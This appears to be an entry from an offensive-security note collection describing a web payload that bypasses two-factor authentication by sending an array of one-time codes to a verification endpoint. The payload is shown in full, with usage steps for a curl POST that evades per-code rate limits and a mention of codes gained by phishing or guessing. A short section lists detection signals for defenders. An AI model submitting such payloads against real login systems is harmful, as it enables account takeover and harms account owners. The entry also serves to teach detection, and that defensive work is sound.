---
type: code
language: json
verified: true
platforms:
  - Web
tags:
  - 2fa
  - bypass
  - payload
validated: true
---

# JSON-OTP-Array-Payload

## Code

```json
{
    "otp":[
        "1234",
        "1111",
        "1337", // GOOD OTP
        "2222",
        "3333",
        "4444",
        "5555"
    ]
}
```

## Description

This JSON payload contains an array of one-time passwords (OTPs) submitted to a 2FA verification endpoint. The endpoint processes the array sequentially, authenticating if any value matches the expected TOTP. The comment indicates "1337" as a valid example for testing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| otp array elements | Individual OTP strings to attempt (6-digit codes, obtained via phishing or guessing) | "1234", "1337" |

## Usage

Save this as a .json file and reference it in a curl POST request to the 2FA endpoint after initial login. Substitute the array with real candidate OTPs to attempt bypass in a single submission, avoiding per-OTP rate limits.

## Detection

- Log analysis for JSON requests with 'otp' as an array instead of a string.
- Anomaly detection in authentication logs showing multiple OTP validations in one request.
- WAF rules to block array payloads in 2FA fields.

## Related

- [[procedures/Bypass-2FA-with-OTP-Array]]
- [[commands/curl-post-otp-array-verification]]
